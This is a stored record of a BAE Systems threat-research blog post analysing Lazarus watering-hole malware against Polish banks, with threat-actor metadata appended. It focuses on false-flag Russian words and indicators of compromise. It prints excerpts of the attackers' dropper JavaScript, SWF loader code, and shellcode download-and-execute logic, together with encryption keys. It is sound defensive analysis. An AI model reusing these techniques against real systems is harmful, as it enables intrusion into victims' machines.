{
    "id": "461d9300-8e91-4f2b-926b-a208104cac5a",
    "created_at": "2022-10-25T16:48:20.537701Z",
    "updated_at": "2025-03-27T02:17:23.385508Z",
    "deleted_at": null,
    "sha1_hash": "9072321a018c8810d71002113c3b3f4a0873e676",
    "title": "BAE Systems Threat Research Blog: Lazarus’ False Flag Malware",
    "authors": "",
    "file_creation_date": "2017-02-28T14:55:37Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 546046,
    "plain_text": "**[Resources](http://www.baesystems.com/en/cybersecurity/resources)** **[Contact us](http://www.baesystems.com/en/cybersecurity/contact-us)**\n### BAE SYSTEMS THREAT RESEARCH\n BLOG\n\n**[Home](http://baesystemsai.blogspot.tw/)** **[Products](http://www.baesystems.com/en/cybersecurity/products)** **[Solutions](http://www.baesystems.com/en/cybersecurity/solutions)** **[News & Events](http://www.baesystems.com/en/cybersecurity/news-and-events)** **[Partners](http://www.baesystems.com/en/cybersecurity/partners)** **[About Us](http://www.baesystems.com/en/cybersecurity/about-us)** **[Careers](http://www.baesystems.com/en/cybersecurity/careers)**\n\n**SEARCH**\n\n\n# THREAT RESEARCH BLOG\n\n\n**[Home » Unlabelled » Lazarus’ False Flag Malware](http://baesystemsai.blogspot.tw/)**\n\n**Posted by Sergei Shevchenko - Monday, 20 February 2017**\n\n## LAZARUS’ FALSE FLAG MALWARE\n\n**_Written by Sergei Shevchenko and Adrian Nish_**\n\n#### BACKGROUND\n\n**We continue to investigate the recent wave of attacks on banks using watering-holes**\n**on at least two financial regulator websites as well as others. Our initial analysis of**\n**malware disclosed in the BadCyber blog hinted at the involvement of the 'Lazarus'**\n**threat actor. Since the release of our report, more samples have come to light, most**\n**notably those described in the Polish language niebezpiecznik.pl** **[blog on 7 February](https://niebezpiecznik.pl/post/jak-przeprowadzono-atak-na-knf-i-polskie-banki-oraz-kto-jeszcze-byl-na-celowniku-przestepcow/)**\n**2017.**\n\n\n-----\n\n|MD5 hash|Filename|Compile Time|File Info|Submitte d|\n|---|---|---|---|---|\n|9216b29114fb6713ef228370cbfe 4045|srservice.c hm|N/A|N/A|N/A|\n|8e32fccd70cec634d13795bcb1d a85ff|srservice.h lp|N/A|N/A|N/A|\n|e29fe3c181ac9ddbb242688b151f 3310|srservice.d ll|2016-10- 22 08:08|Win64 DLL 78 KB|2017-01- 28 11:58|\n|9914075cc687bdc352ee136ac65 79707|fdsvc.exe|2016-08- 26 04:19|Win64 EXE 60 KB|2017-02- 05 15:14|\n|9cc6854bc5e217104734043c89d c4ff8|fdsvc.dll|2016-08- 26 04:11|Encrypte d 470 KB|2017-02- 05 15:15|\n\n\n**Of the hashes provided, only three samples could be found in public malware**\n**repositories. All three had been submitted from Poland in recent weeks.**\n\n**In the analysis section below we examine these and the ‘false flag’ approach**\n**employed by the attackers in order to spoof the origin of the attack. The same ‘false**\n**[flag’ approach was also found in the SWF-based exploit mentioned in our previous](http://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html)**\n**blogpost:**\n\n**MD5 hash** **Filename** **File Info** **Submitted**\n\n**Adobe** **2016-12-07**\n\n**6dffcfa68433f886b2e88fd984b4995a [cambio.sw]**\n\n**f** **Flash** **23:15**\n\n**Here we’ll analyse these files as well as shed further light on the watering-hole exploit**\n**kit code itself, in the hope this aids further detection and network defence.**\n\n#### ANALYSIS\n\n Sample #1 – srservice.chm\n\n**Most likely, this file is an encrypted backdoor that is decrypted and injected by DLL**\n**loader. The filename srservice.chm is consistent with the method in which a**\n**known Lazarus toolkit module constructs CHM and HLP file names:**\n\n|MD5 hash|Filename|File Info|Submitted|\n|---|---|---|---|\n|6dffcfa68433f886b2e88fd984b4995a|cambio.sw f|Adobe Flash|2016-12-07 23:15|\n\n\n**%SYSTEMROOT%\\Help\\%MODULE_NAME%.chm**\n**%SYSTEMROOT%\\Help\\%MODULE_NAME%.hlp**\n\n\n#### S l #2 i hl\n\n\n-----\n\n**Most likely, this file is an encrypted configuration file, which is decrypted and loaded**\n**by the sample #1 (srservice.chm).**\n\n#### Sample #3 – srservice.dll\n\n**This DLL loads, decrypts and injects the 'CHM' file into the system lsass.exe**\n**process.**\n\n#### Sample #4 – fdsvc.exe\n\n**This file is a command line tool that accepts several parameters such as encrypted file**\n**name and process ID. The tool reads and decrypts the specified file, and then injects**\n**it into the specified process or into the system process explorer.exe.**\n\n**The encryption consists of a running XOR, followed with RC4, using the 32-byte RC4**\n**key below:**\n\n\n**A6 EB 96 00 61 B2 E2 EF 0D CB E8 C4 5A F1 66 9C**\n**A4 80 CD 9A F1 2F 46 25 2F DB 16 26 4B C4 3F 3C**\n\n\n#### Sample #5 – fdsvc.dll\n\n**The file fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL**\n**(MD5: 889e320cf66520485e1a0475107d7419) by the aforementioned executable**\n**fdsvc.exe.**\n\n**Once decrypted, it represents itself as a bot that accepts the C&C name and port**\n**number(s) as a string parameter that is used to call the DLL. The parameter is**\n**encoded with an XOR loop that includes XOR key cEzQfoPw.**\n\n**Multiple C&C servers can be delimited with the '|' character and port numbers are**\n**delimited from the C&C servers with the ':' character.**\n\n**Once the bot has established communication with the remote C&C, it uses several**\n**transliterated Russian words to either indicate the state of its communication or issue**\n**backdoor commands, such as:**\n\n\n-----\n\n|\"Nachalo\"|start communication session|\n|---|---|\n|\"ustanavlivat\"|handshake state|\n|\"poluchit\"|receive data|\n|\"pereslat\"|send data|\n|\"derzhat\"|maintain communication session|\n|\"vykhodit\"|exit communication session|\n\n\n**The binary protocol is custom. For example, during the \"ustanavlivat\" (handshake)**\n**mode, the bot accepts 4 bytes, which are then decrypted. The decryption is a loop that**\n**involves multiple XOR operations performed over the received data. Once decrypted,**\n**the 4 bytes indicate the size of the next data chunk to be received.**\n\n**The next received data chunk is also decrypted, and its contents checked to see**\n**whether it's one of the backdoor commands.**\n\n**For example, the \"poluchit\" command instructs the bot to receive the file, and the**\n**_\"pereslat\" (send) command instructs the bot to upload the file. The received \"poluchit\"_**\n**command may also contain a URL, marked with another transliterated Russian word**\n**_\"ssylka\" (link). In this case, the remote file is fetched in a separate thread. If a received_**\n**data chunk contains the command \"vykhodit\", the bot quits its backdoor loop.**\n\n**The bot implements the SSL/TLS protocol, and is based on a source code of \"Curl**\n**_v7.49.1\". Hence, it is able to transfer files via HTTP, HTTPS, FTP, SMTP and many_**\n**other protocols, with full support of user/password authentication (Basic, Digest,**\n**NTLM, Negotiate, Kerberos), proxies and SSL certificates.**\n\n#### Russian language used in fdsvc.dll\n\n**In spite of some 'Russian' words being used, it is evident that the malware author is**\n**not a native Russian speaker.**\n\n**Of our previous examples, five of the commands were likely produced by an online**\n**translation. Below we provide the examples and the correct analogues for reference:**\n\n**Word** **Type of error** **Correct analogue**\n\n**omitted sign at the end, verb tense**\n**_\"ustanavlivat\"_** **_\"ustanovit'\" or \"ustanoviti\"_**\n**error**\n\n**_\"poluchit\"_** **omitted sign at the end** **_\"poluchit'\" or \"poluchiti\"_**\n\n**_\"pereslat\"_** **omitted sign at the end** **_\"pereslat'\" or \"pereslati\"_**\n\n**_\"derzhat\"_** **omitted sign at the end** **_\"derzhat'\" or \"derzhati\"_**\n\n**omitted sign at the end, verb tense**\n**_\"vykhodit\"_** **_\"vyiti\"_**\n**error**\n\n|Word|Type of error|Correct analogue|\n|---|---|---|\n|\"ustanavlivat\"|omitted sign at the end, verb tense error|\"ustanovit'\" or \"ustanoviti\"|\n|\"poluchit\"|omitted sign at the end|\"poluchit'\" or \"poluchiti\"|\n|\"pereslat\"|omitted sign at the end|\"pereslat'\" or \"pereslati\"|\n|\"derzhat\"|omitted sign at the end|\"derzhat'\" or \"derzhati\"|\n\n\n-----\n\n**translation of \"client2connect\" (which means 'client-to-connect'). In this case, the two**\n**words \"client\" and \"connect\" were translated separately, then transliterated from the**\n**Russian pronunciation form into the Latin alphabet and finally joined to produce**\n**_\"kliyent2podklyuchit\"._**\n\n**Such a result may look impressive to the bot's author, but would be difficult to**\n**understand for native Russian speakers.**\n\n**Here we provide an example of translating the word \"client\" in Russian - the word**\n**_\"kliyent\" here only demonstrates phonetic pronunciation, not how it's actually written_**\n**in a transliterated form. When formed using the Latin alphabet, it would actually be**\n**written \"client\" or \"klient\".**\n\n**Due to such inconsistencies, we conclude that the Russian language is likely used as**\n**a decoy tactic, in order to spoof the malware’s country of origin.**\n\n#### Sample #6 – cambio.swf\n\n**During the investigation of the watering-hole incident, the owner of a compromised**\n**website shared with us a malicious implant that was added into the site, presumably**\n**by using an exploit against JBoss 5.0.0.**\n\n**The script is called view_jsp.java and is accessed from the watering-hole website**\n**as view.jsp.**\n\n**This script is responsible for serving cambio.swf.**\n\n**The infection starts from a primary web site being compromised so that its visitors are**\n**redirected into a secondary website, calling its view.jsp script from an added**\n\n\n-----\n\n**\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"**\n\n\n**This begins the profiling and filtering to identify potential victims. For example, the**\n**script then checks to see if the client's IP is black-listed. If so, such initial request is**\n**rejected.**\n\n**Next, the script checks if the client’s IP is white-listed (i.e. targeted). If not white-listed,**\n**it is also rejected. Hence, unless the visitor’s IP is on the attackers’ list, the script will**\n**not attempt to infect their machine. This helps the infected websites stay undetected**\n**for relatively long period of time, as they only serve exploits to the selected targets.**\n\n**In the next stage of the script, it builds and serves back to the client an HTML page**\n**with an embedded JavaScript that detects the type of client’s browser (Internet**\n**Explorer, Google Chrome, Firefox, Safari, or Opera), OS version, and the loaded**\n**plugins, such as Adobe Flash and Microsoft Silverlight.**\n\n**The script executed on a client side then builds a form, and submits it back to the**\n**gateway script, as shown below:**\n\n**The submitted form specifies the pagenum parameter to be set to 2, to advance the**\n**script to the next step:**\n\n\n-----\n\n**Once the script accepts the incoming request and finds the form's pagenum value is**\n**2, it reads other fields from the submitted form and decides which exploit to serve**\n**back to the client.**\n\n**At the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash**\n**and Microsoft Silverlight, though these could be expanded upon as needed.**\n\n**The exploits can be individually enabled or disabled by the attackers with the**\n**standalone file config.dat. For example, to enable both exploits (flag=1), the**\n**contents of this file can be set to:**\n\n\n**2016-0034:1**\n**0000-0001:1**\n\n\n**where 2016-0034 identifies the Silverlight exploit, and 0000-0001 is the Flash**\n**exploit.**\n\n**If the script detects that the submitted form contains a non-empty version of Silverlight**\n**browser plugin, it will generate and serve back a Silverlight exploit. If the submitted**\n**form has a non-empty version of Adobe Flash browser plugin, the script will generate**\n**and serve back the Flash exploit. If the client has both plugins loaded within the**\n**browser, then the script will serve the Flash exploit only.**\n\n**NOTE: the script only serves the Flash exploit if the browser is Internet Explorer.**\n\n**The exploits are generated by the functions:**\n\n**• genExp_20160034() – to generate Silverlight exploit**\n**• genExp_00000001() – to generate Flash exploit**\n\n**The latter is explained in further detail below First the script builds URL string named**\n\n\n-----\n\n**01** **String PARAMNAME_UID = \"uid\";**\n**02** **String PARAMNAME_PAGENUM = \"pagenum\";**\n**03** **String PARAMNAME_EXPLOITID = \"eid\";**\n**04** **String PARAMNAME_STATUS = \"s\";**\n**05** **String PARAMNAME_DATA = \"data\";**\n**06**\n**07** **download_url = request.getRequestURL() +**\n**08** **\"?\" + PARAMNAME_UID + \"=\" + uid +**\n**09** **\"&\" + PARAMNAME_PAGENUM + \"=3\" +**\n**10** **\"&\" + PARAMNAME_EXPLOITID +**\n**11** **\"=\" + exploit.get(\"eid\");**\n**12** **...**\n**13** **download_url = download_url +**\n**14** **\"&\" + PARAMNAME_STATUS + \"=2\" +**\n**15** **\"&\" + PARAMNAME_DATA + \"=\";**\n\n**For example, the URL string may look like:**\n\n\n**http://[WEB_SITE]/view.jsp?**\n**uid=30304811&pagenum=3&eid=00000002&s=2&data=**\n\n\n**Note that the pagenum parameter of the URL has now advanced to 3 (third step of**\n**the view.jsp execution).**\n\n**This URL string will be embedded by the genExp_00000001() function into the**\n**body of the shellcode.**\n\n**The output of the genExp_00000001() function is JavaScript that has the following**\n**format – this script will be executed inside the client's browser:**\n\n**01** **var laskfji = 'PGh0bWw+..'; // long string here**\n**02** **asdlfkj = function(s) {**\n**03** **// base64-decode string s**\n**04** **};**\n**05** **var polkio = asdlfkj(laskfji);**\n**06** **var poikea = 'document.write(polkio);';**\n**07** **eval(poikea);**\n\n**Once the string s is base64-decoded by client-based JavaScript, it will look like a**\n**Flash object embedded into HTML:**\n\n\n-----\n\n**02** **<body>**\n**03** **<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-4445535**\n**04** **codebase=\"http://download.macromedia.com/.../sw**\n**05** **width=\"1\"**\n**06** **height=\"1\" >**\n**07** **<param name=\"movie\" value=\"include/cambio.swf\" />**\n**08** **<param name=\"allowScriptAccess\" value=\"always\" />**\n**09** **<param name=\"FlashVars\"**\n**10** **value=\"shell=558BEC83...00&Health=polki89jdm#k**\n**11** **<param name=\"Play\" value=\"true\" />**\n**12** **<embed type=\"application/x-shockwave-flash\"**\n**13** **width=\"1\"**\n**14** **height=\"1\"**\n**15** **src=\"include/cambio.swf\"**\n**16** **allowScriptAccess=\"always\"**\n**17** **FlashVars=\"shell=558BEC83...00&Health=polki89j**\n**18** **Play=\"true\"/>**\n**19** **</object>**\n**20** **</body>**\n**21** **</html>**\n\n**As seen in the Flash object parameters, the SWF object is served from the website’s**\n**path:**\n\n\n**include/cambio.swf**\n\n\n**However, the SWF object is also accompanied with 2 extra parameters:**\n\n**SWF Parameter** **Value**\n\n**\"shell\"** **558BEC83EC388D45C8C745F...**\n\n**\"Health\"** **polki89jdm#ks@**\n\n**By looking into the decompiled cambio.swf file, its ActionScript reveals that the SWF**\n**file indeed expects 2 parameters: Health and shell.**\n\n**The value of Health is used as an XOR key to decode the binary blob orinBin,**\n**which is included in the SWF file. This blob is then loaded with loadBytes(), as**\n**shown below:**\n\n|SWF Parameter|Value|\n|---|---|\n|\"shell\"|558BEC83EC388D45C8C745F...|\n|\"Health\"|polki89jdm#ks@|\n\n\n-----\n\n**02** **this.params = loaderInfo.parameters;**\n**03** **...**\n**04** **var key:String = params[\"Health\"] as String;**\n**05** **var pShell:String = params[\"shell\"] as String;**\n**06** **var objShellData:SharedObject = SharedObject.getLocal(\"Exp**\n**07** **objShellData.clear();**\n**08** **objShellData.data.shell = pShell;**\n**09** **objShellData.flush();**\n**10** **var blob:ByteArray = new orinBin() as ByteArray;**\n**11** **var i:int = 0;**\n**12** **while(i < blob.length)**\n**13** **{**\n**14** **blob[i] = blob[i] ^ key.charCodeAt(i % key.length);**\n**15** **i++;**\n**16** **}**\n**17** **blob.position = 0;**\n**18** **objLoader.contentLoaderInfo.addEventListener(\"complete\",fn**\n**19** **objLoader.loadBytes(blob);**\n\n**Below is the binary blob orinBin as seen within the SWF file:**\n\n**By knowing the value of Health parameter, it is now possible to use it as an XOR**\n**key to decode the orinBin blob within the SWF code.**\n\n**Once decrypted, the orinBin blob presents another SWF file. This time, it contains 3**\n**encrypted blobs within: bin22, bin23, and bin24 seen below:**\n\n**The code decrypts the blobs with RC4, using \"littleEndian\" as the RC4 key.**\n**These blobs also turn out to be SWF files that contain the SWF exploit code**\n\n\n-----\n\n**Internally, the ActionScript also uses transliterated Russian words, similar to the tactic**\n**seen in the bot code:**\n\n**Transliterated Russian words used in AS** **Translated from Russian**\n\n**_Podgotovkaskotiny_** **Preparation of farm animals**\n\n**_geigeigei3raza_** **Hey, hey, hey 3 times**\n\n**_chainik_** **Dummy (a stupid person)**\n\n**_chainikaddress_** **Dummy's address**\n\n**_poishemdatu_** **Let’s search for data**\n\n**_poiskvpro_** **Searching in 'pro'**\n\n**_vyzov_chainika_** **Calling the dummy (a stupid person)**\n\n**_daiadreschainika_** **Get address of the dummy**\n\n**_runskotina_** **Execute farm animals**\n\n**_babaLEna_** **Old woman Lena**\n\n**As seen in the table, while the words are technically Russian, their usage is out-of-**\n**context.**\n\n**In one code fragment, the ActionScript contains both \"chainik\" and \"dummy\":**\n\n**01** **private function put_dummy_args(param1:*) : ***\n**02** **{**\n**03** **return chainik.call.apply(null,param1);**\n**04** **}**\n**05** **private function vyzov_chainika() : ***\n**06** **{**\n**07** **return chainik.call(null);**\n**08** **}**\n\n**As such, it is obvious that the word \"dummy\" has been translated into \"chainik\".**\n**However, the word \"chainik\" in Russian slang (with the literal meaning of \"a kettle\") is**\n**used to describe an unsophisticated person, a newbie; while, the word \"dummy\" in the**\n**exploit code is used to mean a \"placeholder\" or an \"empty\" data structure/argument.**\n\n**In the same way, it is likely the word \"farm animals\" was originally used to represent**\n**\"a beast\". Yet, it has been translated into a word that is only synonymous to \"the**\n**beast\" in a certain context.**\n\n**As a result, they have used the words \"farm animals\" across the shellcode instead of**\n**\"beast\"; which makes little sense.**\n\n**As in the case of sample #5 (fdsvc.dll), it is likely that this loose Russian**\n**translation, evidently performed by a non-Russian speaker, is intended to spoof the**\n**malware origin.**\n\n|Transliterated Russian words used in AS|Translated from Russian|\n|---|---|\n|Podgotovkaskotiny|Preparation of farm animals|\n|geigeigei3raza|Hey, hey, hey 3 times|\n|chainik|Dummy (a stupid person)|\n|chainikaddress|Dummy's address|\n|poishemdatu|Let’s search for data|\n|poiskvpro|Searching in 'pro'|\n|vyzov_chainika|Calling the dummy (a stupid person)|\n|daiadreschainika|Get address of the dummy|\n|runskotina|Execute farm animals|\n|babaLEna|Old woman Lena|\n\n\n-----\n\n#### Shellcode\n\n**The SWF's ActionScript then loads and executes the shellcode that was passed to the**\n**SWF file. As with the Health parameter, by having access to the server-side code it**\n**is now possible to analyse what shellcode has been served to be executed via SWF**\n**file.**\n\n**The shellcode consists of 2,372 bytes of a Win32-code (in fact, 2,369 bytes padded**\n**with three zero bytes to make it 4-byte aligned).**\n\n**The shellcode passed via the shell parameter consists of two parts:**\n\n**• The first part of the shellcode (818 bytes) creates a hidden process of**\n**notepad.exe. It then injects the second part of the shellcode into it using the**\n**_VirtualAlloc() and WriteProcessMemory() APIs, and finally it runs the injected code_**\n**with CreateRemoteThread() API.**\n\n**• The second part of the shellcode (1,551 bytes) is encoded with XOR 0x57:**\n\n**seg000:00000316** **mov  ecx, 1551** **; counter**\n**seg000:0000031B** **mov  ebx, 57h** **; XOR key**\n**seg000:00000320** **loop:**\n**seg000:00000320** **xor  [eax], ebx**\n**seg000:00000322** **dec  ecx     ; decrement counte**\n**seg000:00000323** **inc  eax     ; advance pointer**\n**seg000:00000324** **test  ecx, ecx**\n**seg000:00000326** **jnz  short loop**\n\n**It's worth noting that both parts of the shellcode load the APIs similarly to all other**\n**tools from the Lazarus toolset, e.g.:**\n\n**01** **urlmon_dll = 'mlrU';      // Urlm**\n**02** **urlmon_dll_4 = 'd.no';     // on.d**\n**03** **urlmon_dll_8 = 'll';      // ll**\n**04** **URLDownloadToFileW = 'DLRU';  // URLD**\n**05** **URLDownloadToFileW_4 = 'lnwo'; // ownl**\n**06** **URLDownloadToFileW_8 = 'Tdao'; // oadT**\n**07** **URLDownloadToFileW_12 = 'liFo'; // oFile**\n**08** **URLDownloadToFileW_16 = 'We';  // eW**\n**09** **hLib = LoadLibrary(&urlmon.dll);**\n**10** **ptr[8] = (*(int)ptr[4])(hLib,  // ptr[4]->GetProcAddress**\n**11** **&URLDownloadToFileW);**\n\n\n-----\n\n**Next, it reads the temporary file into memory, decrypts it with the following XOR loop,**\n**starting from the 318th byte:**\n\n**01** **for (i = 317; i < file_size; ++i )**\n**02** **{**\n**03** **buffer[i] ^= 0xCC ^ ((buffer[i] ^ 0xCC) >> 4);**\n**04** **}**\n\n**Next, it makes the decoded data executable by assigning it**\n**PAGE_EXECUTE_READWRITE memory protection mode, and calls it, as shown below:**\n\n**01** **(*(void)(ptr[68]))(buffer + 318,   // ptr[68]->VirtualP**\n**02** **file_size - 318,  // skip the first 31**\n**03** **PAGE_EXECUTE_READWRITE,**\n**04** **&oldProtect);**\n**05** **((void (*)(void))(buffer + 318))();  // CALL from the 318**\n\n**This way, the 2nd part of the shellcode downloads a binary from the same gateway**\n\n\n**script as before. pagenum=3 means it's a 3 step – a step of serving the next chunkrd**\n\n**of the shellcode.**\n\n**To understand the next step we need to go back to the gateway script to see how it**\n**processes the pagenum=3 request.**\n\n**When the script receives a pagenum=3 request, it checks the 's' URL parameter**\n**('status'). Initially, this parameter is set to 2 ('s=2', as seen in the aforementioned**\n**URL embedded into the SWF exploit).**\n\n**Thus, the script will read and output the contents of 2 files stored on the web server:**\n\n\n**files/mark180789172360.ico**\n**files/back283671047171.dat**\n\n\n**The first file is likely a valid ICO file, is 318 bytes in size, and its contents are not**\n**encoded (hence the reason why the shellcode skips the first 318 bytes, and only**\n**decodes the rest).**\n\n**The second file is a 3 chunk of the shellcode, and its contents are encoded.rd**\n\n**In addition to these 2 files, the output is appended with a URL. This time, it will specify**\n**pagenum parameter set to 3, but the status parameter s will now be set to 3. For**\n**example, the URL may look like:**\n\n\n-----\n\n**The appended URL will then be encoded the same way as the file**\n**back283671047171.dat:**\n\n**01** **for (int i = 0; i < len + 9; i++)**\n**02** **{**\n**03** **byte var = b[i];**\n**04** **byte temp = (byte)((var >> 4) & 0x0F);**\n**05** **var = (byte)(var ^ temp);**\n**06** **var = (byte)(var ^ 0xCC);**\n**07** **b[i] = var;**\n**08** **}**\n\n**This way, the encoded URL becomes an integral part of the 3 part of the shellcode –rd**\n\n\n**same way as the 2nd part of the shellcode was appended with a URL.**\n\n**Following that, the script serves back a blob that consists of three parts:**\n\n**• files/mark180789172360.ico, not encoded (318 bytes)**\n**• files/back283671047171.dat, encoded**\n**• download URL, encoded**\n\n**It is served back as a binary file, disguised as an icon file probg[RANDOM].ico,**\n**probably in an attempt to bypass network sniffers (in other words, the encrypted**\n**shellcode is served appended to a valid icon file):**\n\n\n**response.setHeader(\"Accept-Ranges\", \"bytes\");**\n**response.setHeader(\"Content-Length\", String.format(\"%d\",**\n**response_len));**\n**response.setHeader(\"Content-Disposition\",**\n**\"attachment;filename=\\\"probg\" + rand.nextInt(9000) + 10000 +**\n**\".ico\\\"\");**\n**response.setHeader(\"Content-Type\", \"application/octet-**\n**stream\");**\n\n\n**Once this 3 part of the shellcode is served back to the shellcode that runs on a clientrd**\n\n**side, it will skip the first 318 bytes, decode the rest and execute it. This will invoke**\n**another binary download – this time identified with the status value of 3 ('s=3').**\n\n**The new binary is generated by view.jsp script and is almost identical to the 3rd**\n\n**part of the shellcode.**\n\n**The only difference is that the binary blob consists of these files:**\n\n\n-----\n\n**files/meml102783047891.dat, encoded**\n\n\n**The 2nd file is now different, and the URL is no longer appended. The reason why the**\n\n**new binary does not need the URL embedded may be that this binary contains an**\n**actual malicious executable, detached, decoded, and executed by the shellcode, thus**\n**leading to a full compromise of the victim.**\n\n**Indeed, as seen in the web log below, the last GET request with the pagenum=3 and**\n**s=3 parameters is served with a 123,710-byte response – large enough to**\n**accommodate a PE-executable:**\n\n\n**\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\" 200 66148**\n**\"POST /[PATH]/view.jsp HTTP/1.1\" 200 13991**\n**\"GET /[PATH]/view.jsp?**\n**uid=30304811&pagenum=3&eid=00000002&s=2&data= HTTP/1.1\" 200**\n**4642**\n**\"GET /[PATH]/view.jsp?uid=30304811&pagenum=3&s=3 HTTP/1.1\" 200**\n**123710**\n\n\n**NOTE: At the time of analysis, the ICO/DAT files were not available. Hence, their**\n**contents remains unknown.**\n\n#### Overall Scheme\n\n**The following scheme illustrates the steps outlined above:**\n\n\n-----\n\n#### CONCLUSIONS\n\n**Here we have analysed further files from the recent watering-hole attacks directed at**\n**Polish financial institutions and others. Evidently, the Lazarus group are continuing**\n**their campaign targeting banking networks. Their watering-hole mechanism is fairly**\n**sophisticated – its multiple stages are designed to complicate analysis of its malware**\n**distribution, and at the same, stay undetected for as long as possible.**\n\n**Because of the previously disclosed attribution links, the group are also resorting to**\n**some trickery.**\n\n**Through reverse-engineering, we can see the use of many Russian words that have**\n**been translated incorrectly. In some cases the inaccurate translations have**\n**transformed the meaning of the words entirely. This strongly implies that the authors**\n**of this attack are not native Russian speakers and, as such, the use of Russian words**\n**appears to be a 'false flag'. Clearly the group behind these attacks are evolving their**\n**modus operandi in terms of capabilities – but also it seems they’re attempting to**\n**mislead investigators who might jump to conclusions in terms of attribution.**\n\n#### APPENDIX A: INDICATORS OF COMPROMISE\n\n\n-----\n\n|Col1|9914075cc687bdc352ee136ac6579707|\n|---|---|\n||e29fe3c181ac9ddbb242688b151f3310|\n||9216b29114fb6713ef228370cbfe4045|\n||8e32fccd70cec634d13795bcb1da85ff|\n||889e320cf66520485e1a0475107d7419|\n||6dffcfa68433f886b2e88fd984b4995a|\n|Filenames|cambio.swf|\n||cambio.xap|\n||mark180789172360.ico|\n||meml102783047891.dat|\n||back283671047171.dat|\n|URLs|view.jsp?pagenum=1|\n||view.jsp?uid=|\n\n\n**at 08:51**\n\n**+6  Recommend this on Google**\n\n**No comments:**\n\n**Post a Comment**\n\n\n-----\n\n**Enter your comment...**\n\n\n**Comment as:** **[Select profile...]**\n\n\n\n**[Select profile...]**\n\n\n**PreviewPreview**\n\n\n**[OLDER POST](http://baesystemsai.blogspot.tw/2017/02/lazarus-watering-hole-attacks.html)**\n\n\n**PublishPublish**\n\n\n**POPULAR POSTS**\n\n**TWO BYTES TO $951M**\n\n**[CYBER HEIST ATTRIBUTION](http://baesystemsai.blogspot.tw/2016/05/cyber-heist-attribution.html)**\n\n\n-----\n\n**NEW MAC OS MALWARE EXPLOITS**\n**MACKEEPER**\n\n\n**[Accessibility](https://baesystems.com/page/accessibility)** **[Terms & conditions](https://baesystems.com/page/terms_conditions)** **[Privacy](https://baesystems.com/page/BAES_035568/privacy)** **[Sitemap](https://baesystems.com/page/sitemap)**\n\n\n**© 2015 BAE Systems. All rights**\n\n**reserved**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.02.20.Lazarus_False_Flag_Malware/lazarus-false-flag-malware.html.pdf"
    ],
    "report_names": [
        "lazarus-false-flag-malware.html"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
